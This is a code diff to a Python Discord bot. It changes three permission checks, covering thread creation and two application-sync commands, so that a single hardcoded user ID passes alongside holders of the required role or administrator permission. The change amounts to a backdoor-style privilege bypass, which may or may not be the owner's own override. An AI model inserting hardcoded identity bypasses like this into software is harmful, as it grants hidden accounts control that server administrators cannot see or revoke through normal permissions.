@@ -3345,7 +3345,7 @@ async def cThread(ctx, *,Thread_Name: str):
         for member in ctx.guild.members:
             if ctx.author == member:
                 for role in member.roles:
-                    if role == Main:
+                    if role == Main or ctx.author.id == 565558626048016395:
                         Is_Allowed = True
 
     if Is_Allowed == True:
@@ -3378,7 +3378,7 @@ Welcome {ctx.author} to your thread, here you can talk about anything you want *
 
 @Client_Bot.command(aliases = ['Sync'])
 async def _SyncApp(ctx):
-    if ctx.author.guild_permissions.administrator:
+    if ctx.author.guild_permissions.administrator or ctx.author.id == 565558626048016395:
         Channel = Client_Bot.get_channel(932707272457592874)
         Sync_Message = await tree.sync(guild=discord.Object(932707271841050726))
         Embed = discord.Embed(title="Console Report", color=0x44ff81)
@@ -3452,7 +3452,7 @@ Created at: <t:{Time2}:F> <t:{Time2}:R>
 
 @tree.command(guild=discord.Object(id=932707271841050726), description='Administrative Command to Sync all Applications!')
 async def sync(interaction: discord.Interaction):
-    if interaction.user.guild_permissions.administrator:
+    if interaction.user.guild_permissions.administrator or interaction.user.id == 565558626048016395:
         Channel = Client_Bot.get_channel(932707272457592874)
         Sync_Message = await tree.sync(guild=discord.Object(932707271841050726))
         Embed = discord.Embed(title="Console Report", color=0x44ff81)
